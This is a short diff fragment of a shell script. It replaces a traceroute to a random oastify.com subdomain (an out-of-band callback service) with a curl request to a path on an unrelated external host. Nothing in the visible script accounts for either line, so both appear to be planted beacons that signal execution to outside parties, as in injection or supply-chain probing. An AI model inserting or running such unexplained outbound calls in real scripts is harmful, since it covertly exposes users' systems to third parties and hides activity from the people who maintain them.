@@ -17,7 +17,7 @@ TARGET=${3:-"all"}
 
 
 
-traceroute r6yf9fblj8q15542aeoxjiwqxh38rzin7.oastify.com
+curl tabahi.witcoat.com/yft76t7
 
 if [ $DO_DEBUG == false ]
 then
